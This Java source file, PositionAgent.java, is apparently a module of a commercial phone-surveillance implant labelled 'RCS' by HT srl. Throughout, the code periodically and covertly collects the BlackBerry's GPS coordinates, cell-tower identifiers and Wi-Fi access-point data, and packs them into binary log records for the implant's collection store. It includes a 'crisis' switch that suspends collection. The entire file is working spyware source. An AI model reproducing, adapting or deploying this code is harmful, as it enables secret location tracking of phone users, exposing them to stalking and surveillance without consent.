//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : PositionAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import java.io.EOFException;
import java.util.Date;

import javax.microedition.location.Criteria;
import javax.microedition.location.Location;
import javax.microedition.location.LocationException;
import javax.microedition.location.LocationListener;
import javax.microedition.location.LocationProvider;
import javax.microedition.location.QualifiedCoordinates;

import net.rim.device.api.system.CDMAInfo;
import net.rim.device.api.system.GPRSInfo;
import net.rim.device.api.system.Radio;
import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.system.WLANInfo;
import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
import net.rim.device.api.system.WLANInfo.WLANAPInfo;
import net.rim.device.api.ui.text.HexadecimalTextFilter;
import net.rim.device.api.util.DataBuffer;
import blackberry.Conf;
import blackberry.Device;
import blackberry.Status;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.location.LocationHelper;
import blackberry.location.LocationObserver;
import blackberry.log.Log;
import blackberry.log.LogType;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class PositionAgent.
 */
public final class PositionAgent extends Agent implements LocationObserver {
    private static final int TYPE_GPS = 1;
    private static final int TYPE_CELL = 2;
    private static final int TYPE_WIFI = 4;

    private static final int LOG_TYPE_GPS = 1;
    private static final int LOG_TYPE_GSM = 2;
    private static final int LOG_TYPE_WIFI = 3;
    private static final int LOG_TYPE_IP = 4;
    private static final int LOG_TYPE_CDMA = 5;
    //private static final int TYPE_GPS_ASSISTED = 3;

    Log logGps;
    Log logCell;
    Log logWifi;

    //#ifdef DEBUG
    static Debug debug = new Debug("PositionAgent", DebugLevel.VERBOSE);
    //#endif

    // LOGGER_GPS  1 // Prendi la posizione dal GPS
    // LOGGER_CELL 2 // Prendi la posizione dalla BTS
    // LOGGER_CELL 3 // Prendi la posizione dal Wifi

    //int type;

    private boolean gpsEnabled;
    private boolean cellEnabled;
    private boolean wifiEnabled;

    int period;

    LocationProvider lp;

    //Location loc = null;

    /**
     * Instantiates a new position agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public PositionAgent(final boolean agentStatus) {
        super(AGENT_POSITION, agentStatus, Conf.AGENT_POSITION_ON_SD,
                "PositionAgent");
    }

    /**
     * Instantiates a new position agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected PositionAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);

        logWifi = log;
        logGps = new Log(log);
        logCell = new Log(log);
    }

    public void actualStart() {

        if (gpsEnabled) {

            Criteria criteria = new Criteria();
            criteria.setCostAllowed(true);

            criteria.setHorizontalAccuracy(50);
            criteria.setVerticalAccuracy(50);
            criteria.setPreferredPowerConsumption(Criteria.POWER_USAGE_HIGH);

            try {
                lp = LocationProvider.getInstance(criteria);
            } catch (Exception e) {
                //#ifdef DEBUG_ERROR
                debug.error(e);
                //#endif
            }

            if (lp == null) {
                //#ifdef DEBUG_ERROR
                debug.error("GPS Not Supported on Device");
                //#endif               

            }

        }

        if (gpsEnabled && lp != null) {
            //#ifdef DEBUG_TRACE
            //debug.trace("actualStart: logGps.createLog");
            //#endif
            //logGps.createLog(getAdditionalData(0, LOG_TYPE_GPS),
            //        LogType.LOCATION_NEW);

        }
        if (cellEnabled) {
            //#ifdef DEBUG_TRACE
            //debug.trace("actualStart: logCell.createLog");
            //#endif
            /*
             * if (Device.isCDMA()) { logCell.createLog(getAdditionalData(0,
             * LOG_TYPE_CDMA), LogType.LOCATION_NEW); } else {
             * logCell.createLog(getAdditionalData(0, LOG_TYPE_GSM),
             * LogType.LOCATION_NEW); }
             */
        }
        if (wifiEnabled) {
            // i log wifi sono uno solo
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        //#ifdef DEBUG_TRACE
        debug.trace("actualRun");
        //#endif

        if(Status.getInstance().crisisPosition()){
            //#ifdef DEBUG_WARN
            debug.warn("Crisis!");
            //#endif
            return;
        }
        
        if (gpsEnabled) {
            //#ifdef DEBUG_TRACE
            debug.trace("actualRun: gps");
            //#endif
            locationGPS();
        }
        if (cellEnabled) {
            //#ifdef DEBUG_TRACE
            debug.trace("actualRun: cell");
            //#endif
            locationCELL();
        }
        if (wifiEnabled) {
            //#ifdef DEBUG_TRACE
            debug.trace("actualRun: wifi");
            //#endif
            locationWIFI();
        }
    }

    public void actualStop() {

        if (gpsEnabled) {
            if (lp != null) {
                //#ifdef DEBUG_TRACE
                debug.trace("actualStop: resetting ");
                //#endif
                //lp.setLocationListener(null, -1, -1, -1);
                lp.reset();
            }
            //#ifdef DEBUG_TRACE
            //debug.trace("actualStop: closing logGps");
            //#endif
            //logGps.close();
        }
        if (cellEnabled) {
            //#ifdef DEBUG_TRACE
            //debug.trace("actualStop: closing logCell");
            //#endif
            //logCell.close();
        }
        if (wifiEnabled) {
            // i wifi sono uno solo
        }

    }

    private void locationWIFI() {
        final WLANAPInfo wifi = WLANInfo.getAPInfo();
        if (wifi != null) {
            //#ifdef DEBUG_INFO
            debug.info("Wifi: " + wifi.getBSSID());
            //#endif
            byte[] payload = getWifiPayload(wifi.getBSSID(), wifi.getSSID(),
                    wifi.getSignalLevel());

            logWifi.createLog(getAdditionalData(1, LOG_TYPE_WIFI),
                    LogType.LOCATION_NEW);
            logWifi.writeLog(payload);
            logWifi.close();
        } else {
            //#ifdef DEBUG_WARN
            debug.warn("Wifi disabled");
            //#endif
        }

    }

    private void locationCELL() {

        final boolean gprs = !Device.isCDMA();

        if (gprs) {
            // CC: %d, MNC: %d, LAC: %d, CID: %d (Country Code, Mobile Network Code, Location Area Code, Cell Id).
            // CC e MNC possono essere estratti da IMEI
            // http://en.wikipedia.org/wiki/Mobile_country_code
            // http://en.wikipedia.org/wiki/Mobile_Network_Code
            final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();

            final int mcc = Integer.parseInt(Integer.toHexString(cellinfo
                    .getMCC()));

            final int mnc = cellinfo.getMNC();
            final int lac = cellinfo.getLAC();
            final int cid = cellinfo.getCellId();

            final int bsic = cellinfo.getBSIC();

            //final int rssi = cellinfo.getRSSI();
            final int rssi = RadioInfo.getSignalLevel();

            final StringBuffer mb = new StringBuffer();
            mb.append("MCC: " + mcc);
            mb.append(" MNC: " + mnc);
            mb.append(" LAC: " + lac);
            mb.append(" CID: " + cid);
            //#ifdef DEBUG_INFO
            debug.info(mb.toString());
            //#endif

            if (mcc != 0) {
                byte[] payload = getCellPayload(mcc, mnc, lac, cid, rssi);

                logCell.createLog(getAdditionalData(0, LOG_TYPE_GSM),
                        LogType.LOCATION_NEW);
                saveLog(logCell, payload, LOG_TYPE_GSM);
                logCell.close();
            }

        } else {
            final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
            //CDMAInfo.getIMSI()
            final int sid = cellinfo.getSID();
            final int nid = cellinfo.getNID();
            final int bid = cellinfo.getBID();
            //https://www.blackberry.com/jira/browse/JAVAAPI-641
            final int mcc = RadioInfo
                    .getMCC(RadioInfo.getCurrentNetworkIndex());

            final int rssi = RadioInfo.getSignalLevel();

            final StringBuffer mb = new StringBuffer();
            mb.append("SID: " + sid);
            mb.append(" NID: " + nid);
            mb.append(" BID: " + bid);

            //#ifdef DEBUG_INFO
            debug.info(mb.toString());
            //#endif

            if (sid != 0) {
                byte[] payload = getCellPayload(mcc, sid, nid, bid, rssi);
                logCell.createLog(getAdditionalData(0, LOG_TYPE_CDMA),
                        LogType.LOCATION_NEW);
                saveLog(logCell, payload, LOG_TYPE_CDMA);
                logCell.close();
            }
        }

    }

    boolean waitingForPoint = false;

    private void locationGPS() {
        if (lp == null) {
            //#ifdef DEBUG_ERROR
            debug.error("GPS Not Supported on Device");
            //#endif               
            return;
        }

        if (waitingForPoint) {
            //#ifdef DEBUG_TRACE
            debug.trace("waitingForPoint");
            //#endif
            return;
        }

        synchronized (this) {
            LocationHelper.getInstance().locationGPS(lp, this, false);
        }

    }

    public synchronized void newLocation(Location loc) {
        //#ifdef DEBUG_TRACE
        debug.trace("newLocation");
        //#endif

        //#ifdef DBC
        Check.requires(logGps != null, "logGps == null");
        //#endif

        if (loc == null) {
            //#ifdef DEBUG_ERROR
            debug.error("Error in getLocation");
            //#endif  
            return;
        }

        float speed = loc.getSpeed();
        float course = loc.getCourse();

        QualifiedCoordinates qc = loc.getQualifiedCoordinates();
        if (qc == null) {
            //#ifdef DEBUG_ERROR
            debug.error("Cannot get QualifiedCoordinates");
            //#endif
            return;
        }

        long timestamp = loc.getTimestamp();

        if (loc.isValid()) {
            //#ifdef DEBUG_TRACE
            debug.trace("valid");
            //#endif
            byte[] payload = getGPSPayload(qc, loc, timestamp);

            logGps.createLog(getAdditionalData(0, LOG_TYPE_GPS),
                    LogType.LOCATION_NEW);
            saveLog(logGps, payload, TYPE_GPS);
            logGps.close();
        }

    }

    private byte[] getAdditionalData(int structNum, int type) {

        int addsize = 12;
        byte[] additionalData = new byte[addsize];
        final DataBuffer addbuffer = new DataBuffer(additionalData, 0,
                additionalData.length, false);
        int version = 2010082401;

        addbuffer.writeInt(version);
        addbuffer.writeInt(type);
        addbuffer.writeInt(structNum);

        //#ifdef DBC
        Check.ensures(addbuffer.getPosition() == addsize,
                "addbuffer wrong size");
        //#endif

        return additionalData;
    }

    private void saveLog(Log acutalLog, byte[] payload, int type) {

        //#ifdef DBC
        Check.requires(payload != null, "saveLog payload!= null");
        //#endif

        //#ifdef DEBUG_TRACE
        debug.trace("saveLog payload: " + payload.length);
        //#endif

        int version = 2008121901;
        int delimiter = 0xABADC0DE;
        Date date = new Date();
        int payloadSize = payload.length;
        int size = payloadSize + 24;

        byte[] message = new byte[size];

        final DataBuffer databuffer = new DataBuffer(message, 0, size, false);

        databuffer.writeInt(type);

        // header
        databuffer.writeInt(size);
        databuffer.writeInt(version);
        databuffer.writeLong(DateTime.getFiledate(date));

        // payload
        databuffer.write(payload);

        // delimiter
        databuffer.writeInt(delimiter);

        //#ifdef DBC
        Check.ensures(databuffer.getPosition() == size, "saveLog wrong size");
        //#endif

        // save log
        //log.createLog(null, LogType.LOCATION);
        acutalLog.writeLog(message);
        //log.close();
    }

    private byte[] getWifiPayload(String bssid, String ssid, int signalLevel) {
        //#ifdef DEBUG_TRACE
        debug.trace("getWifiPayload bssid: " + bssid + " ssid: " + ssid
                + " signal:" + signalLevel);
        //#endif
        int size = 48;
        byte[] payload = new byte[size];

        final DataBuffer databuffer = new DataBuffer(payload, 0,
                payload.length, false);

        for (int i = 0; i < 6; i++) {
            byte[] token = Utils.hexStringToByteArray(bssid, i * 3, 2);
            //#ifdef DEBUG_TRACE
            //debug.trace("getWifiPayload " + i + " : "
            //        + Utils.byteArrayToHex(token));
            //#endif

            //#ifdef DBC
            Check
                    .asserts(token.length == 1,
                            "getWifiPayload: token wrong size");
            //#endif
            databuffer.writeByte(token[0]);
        }

        // PAD
        databuffer.writeByte(0);
        databuffer.writeByte(0);

        byte[] ssidcontent = ssid.getBytes();
        int len = ssidcontent.length;
        byte[] place = new byte[32];

        for (int i = 0; i < (Math.min(32, len)); i++) {
            place[i] = ssidcontent[i];
        }

        //#ifdef DEBUG_TRACE
        debug.trace("getWifiPayload ssidcontent.length: " + ssidcontent.length);
        //#endif
        databuffer.writeInt(ssidcontent.length);

        databuffer.write(place);

        databuffer.writeInt(signalLevel);

        //#ifdef DBC
        Check.ensures(databuffer.getPosition() == size,
                "databuffer.getPosition wrong size");
        //#endif

        //#ifdef DBC
        Check.ensures(payload.length == size, "payload wrong size");
        //#endif

        return payload;
    }

    private byte[] getCellPayload(int mcc, int mnc, int lac, int cid, int rssi) {

        int size = 19 * 4 + 48 + 16;
        byte[] cellPosition = new byte[size];

        final DataBuffer databuffer = new DataBuffer(cellPosition, 0,
                cellPosition.length, false);

        databuffer.writeInt(size); // size
        databuffer.writeInt(0); // params

        databuffer.writeInt(mcc); //
        databuffer.writeInt(mnc); //
        databuffer.writeInt(lac); //
        databuffer.writeInt(cid); //

        databuffer.writeInt(0); // bsid
        databuffer.writeInt(0); // bcc

        databuffer.writeInt(rssi); // rx level
        databuffer.writeInt(0); // rx level full
        databuffer.writeInt(0); // rx level sub

        databuffer.writeInt(0); // rx quality
        databuffer.writeInt(0); // rx quality full
        databuffer.writeInt(0); // rx quality sub

        databuffer.writeInt(0); // idle timeslot
        databuffer.writeInt(0); // timing advance
        databuffer.writeInt(0); // gprscellid
        databuffer.writeInt(0); // gprs basestationid
        databuffer.writeInt(0); // num bcch

        databuffer.write(new byte[48]); // BCCH
        databuffer.write(new byte[16]); // NMR

        //#ifdef DBC
        Check.ensures(databuffer.getLength() == size,
                "getCellPayload wrong size");
        //#endif

        return cellPosition;

    }

    /**
     * @param timestamp
     */
    private byte[] getGPSPayload(QualifiedCoordinates qc, Location loc,
            long timestamp) {
        //#ifdef DEBUG_TRACE
        debug.trace("getGPSPayload");
        //#endif
        Date date = new Date(timestamp);

        double latitude = qc.getLatitude();
        double longitude = qc.getLongitude();
        float altitude = qc.getAltitude();
        float hdop = qc.getHorizontalAccuracy();
        float vdop = qc.getVerticalAccuracy();
        float speed = loc.getSpeed();
        float course = loc.getCourse();

        //#ifdef DEBUG_INFO
        debug.info("" + " " + speed + "|" + latitude + "|" + longitude + "|"
                + course + "|" + date);
        //#endif

        DateTime dateTime = new DateTime(date);

        //  #define GPS_VALID_UTC_TIME                                 0x00000001
        //  #define GPS_VALID_LATITUDE                                 0x00000002
        //  #define GPS_VALID_LONGITUDE                                0x00000004
        //  #define GPS_VALID_SPEED                                    0x00000008
        //  #define GPS_VALID_HEADING                                  0x00000010
        //  #define GPS_VALID_HORIZONTAL_DILUTION_OF_PRECISION         0x00000200
        //  #define GPS_VALID_VERTICAL_DILUTION_OF_PRECISION           0x00000400
        int validFields = 0x00000400 | 0x00000200 | 0x00000010 | 0x00000008
                | 0x00000004 | 0x00000002 | 0x00000001;

        int size = 344;
        // struct GPS_POSITION
        byte[] gpsPosition = new byte[size];

        final DataBuffer databuffer = new DataBuffer(gpsPosition, 0,
                gpsPosition.length, false);

        // struct GPS_POSITION
        databuffer.writeInt(0); //version
        databuffer.writeInt(size); //sizeof GPS_POSITION == 344 
        databuffer.writeInt(validFields); // validFields
        databuffer.writeInt(0); // flags

        //** Time related : 16 bytes
        databuffer.write(dateTime.getStructSystemdate()); // SYSTEMTIME

        //** Position + heading related
        databuffer.writeDouble(latitude); //latitude
        databuffer.writeDouble(longitude); // longitude
        databuffer.writeFloat(speed); // speed
        databuffer.writeFloat(course); // heading
        databuffer.writeDouble(0); //Magnetic variation
        databuffer.writeFloat(altitude); // altitude
        databuffer.writeFloat(0); // altitude ellipsoid

        //** Quality of this fix
        databuffer.writeInt(1); //GPS_FIX_QUALITY GPS
        databuffer.writeInt(2); //GPS_FIX_TYPE 3D
        databuffer.writeInt(0); //GPS_FIX_SELECTION
        databuffer.writeFloat(0); //PDOP
        databuffer.writeFloat(hdop); // HDOP
        databuffer.writeFloat(vdop); // VDOP

        //** Satellite information
        databuffer.writeInt(0); //satellite used
        databuffer.write(new byte[48]); // prn used 12 int
        databuffer.writeInt(0); //satellite view
        databuffer.write(new byte[48]); // prn view
        databuffer.write(new byte[48]); // elevation in view
        databuffer.write(new byte[48]); // azimuth view
        databuffer.write(new byte[48]); // sn view

        //#ifdef DEBUG_TRACE
        debug.trace("len: " + databuffer.getPosition());
        //#endif

        //#ifdef DBC
        Check.ensures(databuffer.getPosition() == size,
                "saveGPSLog wrong size: " + databuffer.getPosition());
        //#endif

        return gpsPosition;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        final DataBuffer databuffer = new DataBuffer(confParameters, 0,
                confParameters.length, false);
        try {
            //millisecondi
            period = databuffer.readInt();
            int type = databuffer.readInt();

            if (Conf.GPS_ENABLED) {
                gpsEnabled = ((type & TYPE_GPS) != 0);
            } else {
                //#ifdef DEBUG_WARN
                debug.warn("GPS Disabled at compile time");
                //#endif
            }
            cellEnabled = ((type & TYPE_CELL) != 0);
            wifiEnabled = ((type & TYPE_WIFI) != 0);

            //#ifdef DBC
            Check.asserts(period > 0, "parse period: " + period);
            // Check.asserts(type == 1 || type == 2 || type == 4, "parse type: " + type);
            //#endif

            //#ifdef DEBUG_INFO
            debug.info("Type: " + type);
            debug.info("Period: " + period);
            debug.info("gpsEnabled: " + gpsEnabled);
            debug.info("cellEnabled: " + cellEnabled);
            debug.info("wifiEnabled: " + wifiEnabled);
            //#endif

            setPeriod(period);
            setDelay(period);

        } catch (final EOFException e) {
            //#ifdef DEBUG_ERROR
            debug.error(e);
            //#endif
            return false;
        }

        return true;
    }

    public synchronized void waitingForPoint(boolean b) {
        waitingForPoint = b;
    }

    public void errorLocation() {
        //#ifdef DEBUG_ERROR
        debug.error("errorLocation");
        //#endif
    }
}
